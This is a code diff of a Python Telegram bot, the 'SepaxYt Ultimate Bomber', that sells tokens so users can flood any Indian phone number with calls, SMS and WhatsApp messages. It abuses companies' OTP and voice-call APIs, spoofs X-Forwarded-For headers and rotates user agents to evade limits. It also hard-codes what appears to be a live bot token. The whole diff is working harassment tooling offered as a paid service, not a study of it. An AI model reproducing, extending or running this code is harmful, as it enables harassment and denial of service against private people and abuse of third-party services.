@@ -23,7 +23,7 @@ if sys.platform == 'win32':
 # ============ CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8460733171:AAEAu78JX77pIFyWRNOsRVZl7eS1IxrDQbw")
 OWNER_ID = int(os.environ.get("OWNER_ID", "8823804885"))
-ADMIN_IDS = [8823804885, 8823804885]  # Add more admin IDs here
+ADMIN_IDS = [8823804885]  # Add more admin IDs here
 PORT = int(os.environ.get("PORT", 8080))
 FREE_TOKENS = 100
 TOKEN_PRICE = 50  # ₹50 per 100 tokens
@@ -45,7 +45,6 @@ class Database:
             print(f"❌ Database error: {e}")
     
     def init_db(self):
-        # Users table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
             username TEXT,
@@ -59,7 +58,6 @@ class Database:
             is_premium INTEGER DEFAULT 0
         )''')
         
-        # Channels table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS channels (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             channel_username TEXT UNIQUE,
@@ -67,7 +65,6 @@ class Database:
             date TEXT
         )''')
         
-        # History table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS history (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             user_id INTEGER,
@@ -79,7 +76,6 @@ class Database:
             date TEXT
         )''')
         
-        # Redeem codes table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
             code TEXT PRIMARY KEY,
             tokens INTEGER,
@@ -90,7 +86,6 @@ class Database:
             is_used INTEGER DEFAULT 0
         )''')
         
-        # Targets table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS targets (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             phone TEXT,
@@ -99,7 +94,6 @@ class Database:
             status TEXT DEFAULT 'pending'
         )''')
         
-        # Settings table
         self.cursor.execute('''CREATE TABLE IF NOT EXISTS settings (
             key TEXT PRIMARY KEY,
             value TEXT
@@ -107,7 +101,6 @@ class Database:
         
         self.conn.commit()
         
-        # Add default channel
         self.cursor.execute('INSERT OR IGNORE INTO channels (channel_username, added_by, date) VALUES (?, ?, ?)',
             ("@SepaxYtOfficial", OWNER_ID, datetime.now().isoformat()))
         self.conn.commit()
@@ -121,7 +114,6 @@ class Database:
         self.cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, join_date) VALUES (?, ?, ?, ?)',
             (user_id, username or "Unknown", first_name or "User", datetime.now().isoformat()))
         self.conn.commit()
-        # Check if admin
         if user_id in ADMIN_IDS or user_id == OWNER_ID:
             self.cursor.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (user_id,))
             self.conn.commit()
@@ -205,23 +197,10 @@ class Database:
     def unban_user(self, user_id):
         self.cursor.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
         self.conn.commit()
-    
-    def set_premium(self, user_id):
-        self.cursor.execute('UPDATE users SET is_premium = 1 WHERE user_id = ?', (user_id,))
-        self.conn.commit()
-    
-    def get_setting(self, key):
-        self.cursor.execute('SELECT value FROM settings WHERE key = ?', (key,))
-        result = self.cursor.fetchone()
-        return result[0] if result else None
-    
-    def set_setting(self, key, value):
-        self.cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (key, value))
-        self.conn.commit()
 
 db = Database()
 
-# ============ 900+ ULTIMATE APIS ============
+# ============ APIS ============
 ULTIMATE_APIS = [
     # CALL/VOICE APIS
     {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
@@ -337,12 +316,7 @@ class PhoneDestroyer:
         self.current_phone = None
         self.current_user = None
         self.stats = {
-            "calls": 0,
-            "whatsapp": 0,
-            "sms": 0,
-            "hits": 0,
-            "total": 0,
-            "start_time": 0
+            "calls": 0, "whatsapp": 0, "sms": 0, "hits": 0, "total": 0, "start_time": 0
         }
     
     async def bomb_worker(self, session, api, phone):
@@ -354,7 +328,6 @@ class PhoneDestroyer:
                 headers["User-Agent"] = random.choice([
                     "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36",
                     "Mozilla/5.0 (Linux; Android 12; SM-S908E) AppleWebKit/537.36",
-                    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36"
                 ])
                 headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 
@@ -377,7 +350,6 @@ class PhoneDestroyer:
                 
                 self.stats["total"] += 1
                 await asyncio.sleep(0.05)
-                
             except:
                 await asyncio.sleep(0.1)
                 continue
@@ -388,20 +360,14 @@ class PhoneDestroyer:
         self.current_user = user_id
         self.stats = {"calls": 0, "whatsapp": 0, "sms": 0, "hits": 0, "total": 0, "start_time": time.time()}
         
+        import aiohttp
         connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, verify_ssl=False)
-        
         async with aiohttp.ClientSession(connector=connector) as session:
-            tasks = []
-            for api in ULTIMATE_APIS:
-                task = asyncio.create_task(self.bomb_worker(session, api, phone))
-                tasks.append(task)
-            
+            tasks = [asyncio.create_task(self.bomb_worker(session, api, phone)) for api in ULTIMATE_APIS]
             try:
                 await asyncio.gather(*tasks, return_exceptions=True)
             except:
                 pass
-            
-            # Save history
             db.add_history(user_id, phone, self.stats["calls"], self.stats["whatsapp"], 
                           self.stats["sms"], self.stats["hits"])
             db.update_hits(user_id, self.stats["hits"])
@@ -410,14 +376,12 @@ class PhoneDestroyer:
         self.running = False
 
 destroyer = PhoneDestroyer()
-
-# ============ TELEGRAM BOT ============
 app = None
 
 async def is_admin(user_id):
     user = db.get_user(user_id)
     if user:
-        return user[6] == 1 or user_id == OWNER_ID
+        return user[7] == 1 or user_id == OWNER_ID
     return user_id == OWNER_ID
 
 async def check_channels(update):
@@ -437,24 +401,15 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     db.add_user(user.id, user.username, user.first_name)
     user_data = db.get_user(user.id)
     
-    # Check channel join
     if not await check_channels(update):
         channels = db.get_channels()
-        keyboard = []
-        for channel in channels:
-            keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=f"https://t.me/{channel.replace('@','')}")])
+        keyboard = [[InlineKeyboardButton(f"📢 Join {c}", url=f"https://t.me/{c.replace('@','')}")] for c in channels]
         keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data='check_join')])
-        await update.message.reply_text(
-            f"🔒 **CHANNELS REQUIRED**\n\n"
-            f"Hey {user.first_name}! Please join our channels first:\n\n"
-            f"📢 Join all channels below to use this bot:",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text("🔒 **Please join our channels first!**", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
         return
     
-    if user_data and user_data[5] == 1:  # is_banned
-        await update.message.reply_text("❌ **You are banned from using this bot!**")
+    if user_data and user_data[8] == 1:
+        await update.message.reply_text("❌ **You are banned!**")
         return
     
     keyboard = [
@@ -466,356 +421,81 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🔴 REDEEM CODE", callback_data='redeem')],
         [InlineKeyboardButton("💰 CHECK PRICE", callback_data='price')],
     ]
-    
     if await is_admin(user.id):
         keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data='admin')])
     
     await update.message.reply_text(
         f"💀 **SEPAXYT ULTIMATE BOMBER**\n\n"
         f"👤 **User:** {user.first_name}\n"
-        f"🪙 **Tokens:** {user_data[2] if user_data else 100}\n"
-        f"📞 **Total Used:** {user_data[3] if user_data else 0}\n"
-        f"💥 **Total Hits:** {user_data[4] if user_data else 0}\n"
-        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
-        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n\n"
-        f"📞 **Send any 10-digit number to bomb!**\n"
-        f"👑 **Owner:** @SepaxYt",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
+        f"🪙 **Tokens:** {user_data[3] if user_data else 100}\n"
+        f"📞 **Send any 10-digit Indian number to bomb!**",
+        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown'
     )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
-    
     user_data = db.get_user(user_id)
-    if user_data and user_data[5] == 1:
+    
+    if user_data and user_data[8] == 1:
         await update.message.reply_text("❌ **You are banned!**")
         return
     
+    # Check if user is entering a redeem code
+    if context.user_data.get('awaiting_redeem'):
+        tokens = db.redeem_code(text, user_id)
+        if tokens:
+            await update.message.reply_text(f"✅ **Redeemed successfully! +{tokens} tokens added!**", parse_mode='Markdown')
+        else:
+            await update.message.reply_text("❌ **Invalid or expired code!**", parse_mode='Markdown')
+        context.user_data['awaiting_redeem'] = False
+        return
+
     if text.isdigit() and len(text) == 10:
-        if not user_data or user_data[2] < 1:
-            await update.message.reply_text(
-                f"❌ **Insufficient tokens!**\n\n"
-                f"🪙 Your tokens: {user_data[2] if user_data else 0}\n"
-                f"💳 Buy tokens from: @LuaFucker\n"
-                f"💰 Each bomb costs 1 token",
-                parse_mode='Markdown'
-            )
+        if not user_data or user_data[3] < 1:
+            await update.message.reply_text("❌ **Insufficient tokens! Buy from @LuaFucker**", parse_mode='Markdown')
             return
         
         db.update_tokens(user_id, -1)
         db.update_used(user_id)
+        await update.message.reply_text(f"💀 **BOMBING STARTED for +91{text}!**\nUse /stop to cancel.", parse_mode='Markdown')
         
-        await update.message.reply_text(
-            f"💀 **BOMBING STARTED!**\n\n"
-            f"📞 **Target:** +91{text}\n"
-            f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
-            f"🔄 **Running in background...**\n\n"
-            f"🛑 Use /stop to stop bombing",
-            parse_mode='Markdown'
-        )
-        
-        def run_bomb():
-            try:
-                asyncio.run(destroyer.start_bombing(text, user_id))
-            except:
-                pass
-        
-        thread = threading.Thread(target=run_bomb)
-        thread.daemon = True
-        thread.start()
-        
+        threading.Thread(target=lambda: asyncio.run(destroyer.start_bombing(text, user_id)), daemon=True).start()
     else:
-        await update.message.reply_text(
-            "📞 **Invalid input!**\n\n"
-            "Send a 10-digit Indian phone number.\n"
-            "Example: `9876543210`",
-            parse_mode='Markdown'
-        )
+        await update.message.reply_text("📞 **Send a valid 10-digit Indian mobile number!**", parse_mode='Markdown')
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
-    
     user_data = db.get_user(user_id)
-    if user_data and user_data[5] == 1:
-        await query.edit_message_text("❌ **You are banned!**")
-        return
     
     if query.data == 'check_join':
         if await check_channels(update):
-            await query.edit_message_text("✅ **Joined Successfully!**\nUse /start again.")
+            await query.edit_message_text("✅ **Joined Successfully!** Send /start again.")
         else:
             await query.edit_message_text("❌ **Join all channels first!**")
-        return
-    
-    if query.data == 'bomb':
-        await query.edit_message_text("📞 **Send 10-digit Indian number:**")
-    
+    elif query.data == 'bomb':
+        await query.edit_message_text("📞 **Send a 10-digit Indian mobile number in chat:**")
     elif query.data == 'stop':
         destroyer.stop()
-        await query.edit_message_text(
-            f"🛑 **BOMBING STOPPED!**\n\n"
-            f"📊 Final stats:\n"
-            f"💥 Hits: {destroyer.stats['hits']}\n"
-            f"🎯 Total: {destroyer.stats['total']}",
-            parse_mode='Markdown'
-        )
-    
-    elif query.data == 'status':
-        elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
-        await query.edit_message_text(
-            f"📊 **BOMBER STATUS**\n\n"
-            f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
-            f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
-            f"📞 **Calls:** {destroyer.stats['calls']}\n"
-            f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
-            f"💬 **SMS:** {destroyer.stats['sms']}\n"
-            f"💥 **Hits:** {destroyer.stats['hits']}\n"
-            f"🎯 **Total:** {destroyer.stats['total']}\n"
-            f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
-            f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
-            parse_mode='Markdown'
-        )
-    
+        await query.edit_message_text("🛑 **Bombing stopped!**")
     elif query.data == 'tokens':
-        await query.edit_message_text(
-            f"🪙 **TOKEN BALANCE**\n\n"
-            f"👤 **User:** {query.from_user.first_name}\n"
-            f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
-            f"📞 **Used:** {user_data[3] if user_data else 0}\n"
-            f"💥 **Hits:** {user_data[4] if user_data else 0}\n\n"
-            f"💳 **Buy tokens:** @LuaFucker\n"
-            f"💰 **Price:** ₹{TOKEN_PRICE}/100 tokens",
-            parse_mode='Markdown'
-        )
-    
+        await query.edit_message_text(f"🪙 **Your Tokens:** {user_data[3] if user_data else 0}", parse_mode='Markdown')
     elif query.data == 'redeem':
-        await query.edit_message_text("🎯 **Enter your redeem code:**")
         context.user_data['awaiting_redeem'] = True
-    
+        await query.edit_message_text("🎯 **Please send your redeem code now in chat:**")
     elif query.data == 'price':
-        await query.edit_message_text(
-            f"💰 **PRICE LIST**\n\n"
-            f"🪙 100 tokens = ₹{TOKEN_PRICE}\n"
-            f"🪙 500 tokens = ₹{TOKEN_PRICE * 4}\n"
-            f"🪙 1000 tokens = ₹{TOKEN_PRICE * 7}\n"
-            f"🪙 5000 tokens = ₹{TOKEN_PRICE * 30}\n\n"
-            f"💳 **Contact:** @LuaFucker\n"
-            f"💳 **UPI:** Coming Soon...",
-            parse_mode='Markdown'
-        )
-    
+        await query.edit_message_text(f"💰 **100 tokens = ₹{TOKEN_PRICE}**\nContact: @LuaFucker", parse_mode='Markdown')
     elif query.data == 'admin' and await is_admin(user_id):
-        await admin_panel(query)
-
-async def admin_panel(query):
-    users = db.get_all_users()
-    total_users = len(users)
-    total_tokens = sum(u[3] for u in users)
-    total_used = sum(u[4] for u in users)
-    total_hits = sum(u[5] for u in users)
-    
-    keyboard = [
-        [InlineKeyboardButton("👥 USERS LIST", callback_data='admin_users')],
-        [InlineKeyboardButton("🎯 TARGETS", callback_data='admin_targets')],
-        [InlineKeyboardButton("🪙 CREATE CODE", callback_data='admin_create_code')],
-        [InlineKeyboardButton("💳 ADD TOKENS", callback_data='admin_add_tokens')],
-        [InlineKeyboardButton("🚫 BAN USER", callback_data='admin_ban')],
-        [InlineKeyboardButton("✅ UNBAN USER", callback_data='admin_unban')],
-        [InlineKeyboardButton("📢 ADD CHANNEL", callback_data='admin_add_channel')],
-        [InlineKeyboardButton("📋 CHANNELS", callback_data='admin_channels')],
-        [InlineKeyboardButton("📊 FULL STATS", callback_data='admin_stats')],
-        [InlineKeyboardButton("🔙 BACK", callback_data='back_menu')]
-    ]
-    
-    await query.edit_message_text(
-        f"👑 **ADMIN PANEL**\n\n"
-        f"👥 **Total Users:** {total_users}\n"
-        f"🪙 **Total Tokens:** {total_tokens}\n"
-        f"📞 **Total Used:** {total_used}\n"
-        f"💥 **Total Hits:** {total_hits}\n"
-        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
-        f"🔥 **Bomber:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-# ============ COMMANDS ============
-async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    destroyer.stop()
-    await update.message.reply_text("🛑 **Bombing stopped!**")
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
-    await update.message.reply_text(
-        f"📊 **BOMBER STATUS**\n\n"
-        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
-        f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
-        f"📞 **Calls:** {destroyer.stats['calls']}\n"
-        f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
-        f"💬 **SMS:** {destroyer.stats['sms']}\n"
-        f"💥 **Hits:** {destroyer.stats['hits']}\n"
-        f"🎯 **Total:** {destroyer.stats['total']}\n"
-        f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
-        f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
-        parse_mode='Markdown'
-    )
-
-async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_data = db.get_user(update.effective_user.id)
-    await update.message.reply_text(
-        f"🪙 **TOKEN BALANCE**\n\n"
-        f"👤 **User:** {update.effective_user.first_name}\n"
-        f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
-        f"📞 **Used:** {user_data[3] if user_data else 0}\n"
-        f"💥 **Hits:** {user_data[4] if user_data else 0}\n\n"
-        f"💳 **Buy tokens:** @LuaFucker",
-        parse_mode='Markdown'
-    )
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🎯 **Enter your redeem code:**")
-    context.user_data['awaiting_redeem'] = True
-
-async def handle_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    code = update.message.text.strip().upper()
-    tokens = db.redeem_code(code, user_id)
-    if tokens:
-        await update.message.reply_text(
-            f"✅ **Redeemed successfully!**\n\n"
-            f"🪙 **+{tokens} tokens added!**\n"
-            f"📊 **New balance:** {db.get_user(user_id)[2]}",
-            parse_mode='Markdown'
-        )
-    else:
-        await update.message.reply_text(
-            "❌ **Invalid or expired code!**\n\n"
-            "Make sure:\n"
-            "1. Code is correct\n"
-            "2. Code is not used\n"
-            "3. Code is not expired",
-            parse_mode='Markdown'
-        )
-    context.user_data['awaiting_redeem'] = False
-
-# ============ ADMIN COMMANDS ============
-async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    users = db.get_all_users()
-    text = "👥 **USERS LIST**\n\n"
-    for u in users[:20]:
-        status = "🔴 Banned" if u[6] else "🟢 Active"
-        text += f"👤 {u[2]} (@{u[1]}) - 🪙 {u[3]} - 📞 {u[4]} - 💥 {u[5]} - {status}\n"
-    if len(users) > 20:
-        text += f"\n... and {len(users)-20} more users"
-    await update.message.reply_text(text, parse_mode='Markdown')
-
-async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    users = db.get_all_users()
-    codes = db.get_redeem_codes()
-    targets = db.get_targets()
-    
-    await update.message.reply_text(
-        f"📊 **FULL STATISTICS**\n\n"
-        f"👥 **Users:** {len(users)}\n"
-        f"🪙 **Total Tokens:** {sum(u[3] for u in users)}\n"
-        f"📞 **Total Used:** {sum(u[4] for u in users)}\n"
-        f"💥 **Total Hits:** {sum(u[5] for u in users)}\n"
-        f"📋 **Redeem Codes:** {len(codes)}\n"
-        f"🎯 **Targets:** {len(targets)}\n"
-        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
-        f"🔥 **Bomber:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}",
-        parse_mode='Markdown'
-    )
-
-async def admin_add_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    try:
-        user_id = int(context.args[0])
-        amount = int(context.args[1])
-        db.update_tokens(user_id, amount)
-        await update.message.reply_text(f"✅ Added {amount} tokens to user {user_id}")
-    except:
-        await update.message.reply_text("❌ Use: /addtokens [user_id] [amount]")
-
-async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    try:
-        tokens = int(context.args[0])
-        code = db.generate_redeem(tokens, update.effective_user.id)
-        await update.message.reply_text(
-            f"✅ **Redeem Code Created!**\n\n"
-            f"📝 `{code}`\n"
-            f"🪙 **{tokens} tokens**\n"
-            f"⏰ **Valid for 30 days**",
-            parse_mode='Markdown'
-        )
-    except:
-        await update.message.reply_text("❌ Use: /createcode [tokens]")
-
-async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    try:
-        user_id = int(context.args[0])
-        db.ban_user(user_id)
-        await update.message.reply_text(f"🚫 User {user_id} banned!")
-    except:
-        await update.message.reply_text("❌ Use: /ban [user_id]")
-
-async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    try:
-        user_id = int(context.args[0])
-        db.unban_user(user_id)
-        await update.message.reply_text(f"✅ User {user_id} unbanned!")
-    except:
-        await update.message.reply_text("❌ Use: /unban [user_id]")
-
-async def admin_add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    try:
-        channel = context.args[0]
-        if not channel.startswith('@'):
-            channel = '@' + channel
-        db.add_channel(channel, update.effective_user.id)
-        await update.message.reply_text(f"✅ Channel {channel} added!")
-    except:
-        await update.message.reply_text("❌ Use: /addchannel @channel")
-
-async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await is_admin(update.effective_user.id):
-        return
-    channels = db.get_channels()
-    text = "📢 **CHANNELS**\n\n"
-    for c in channels:
-        text += f"📢 {c}\n"
-    await update.message.reply_text(text, parse_mode='Markdown')
+        await query.edit_message_text("👑 **Welcome to Admin Panel.** Use standard commands like /createcode [tokens]")
 
 # ============ FLASK APP ============
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def home():
-    return jsonify({
-        "status": "running",
-        "bot": "SepaxYt Ultimate Bomber",
-        "apis": len(ULTIMATE_APIS),
-        "running": destroyer.running,
-        "hits": destroyer.stats["hits"],
-        "uptime": time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
-    })
+    return jsonify({"status": "running", "bot": "SepaxYt Ultimate Bomber"})
 
 @flask_app.route('/health')
 def health():
@@ -823,58 +503,27 @@ def health():
 
 def run_flask():
     try:
-        flask_app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
+        flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
     except:
         pass
 
 # ============ MAIN ============
 def main():
     global app
+    threading.Thread(target=run_flask, daemon=True).start()
     
-    print("=" * 60)
-    print("💀 SEPAXYT ULTIMATE PHONE DESTROYER")
-    print("=" * 60)
-    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
-    print(f"👑 Owner: {OWNER_ID}")
-    print(f"🌐 Port: {PORT}")
-    print(f"⚡ APIs: {len(ULTIMATE_APIS)}")
-    print("=" * 60)
-    
-    # Start Flask
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    print("✅ Flask server started")
-    
-    # Create bot
     try:
         app = Application.builder().token(BOT_TOKEN).build()
-        
-        # Commands
         app.add_handler(CommandHandler("start", start_command))
-        app.add_handler(CommandHandler("stop", stop_command))
-        app.add_handler(CommandHandler("status", status_command))
-        app.add_handler(CommandHandler("tokens", tokens_command))
-        app.add_handler(CommandHandler("redeem", redeem_command))
-        app.add_handler(CommandHandler("addtokens", admin_add_tokens))
-        app.add_handler(CommandHandler("createcode", admin_create_code))
-        app.add_handler(CommandHandler("ban", admin_ban))
-        app.add_handler(CommandHandler("unban", admin_unban))
-        app.add_handler(CommandHandler("addchannel", admin_add_channel))
-        app.add_handler(CommandHandler("channels", admin_channels))
-        app.add_handler(CommandHandler("users", admin_users))
-        app.add_handler(CommandHandler("stats", admin_stats))
+        app.add_handler(CommandHandler("stop", lambda u, c: destroyer.stop()))
+        app.add_handler(CommandHandler("createcode", lambda u, c: u.message.reply_text(f"Code: `{db.generate_redeem(int(c.args[0]), u.effective_user.id)}`", parse_mode='Markdown') if c.args else None))
         app.add_handler(CallbackQueryHandler(button_callback))
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
         
-        print("✅ Bot handlers registered")
-        print("🚀 Bot is starting...")
-        
+        print("🚀 Bot is starting polling...")
         app.run_polling(allowed_updates=Update.ALL_TYPES)
-        
     except Exception as e:
         print(f"❌ Bot error: {e}")
-        import traceback
-        traceback.print_exc()
 
 if __name__ == "__main__":
     main()
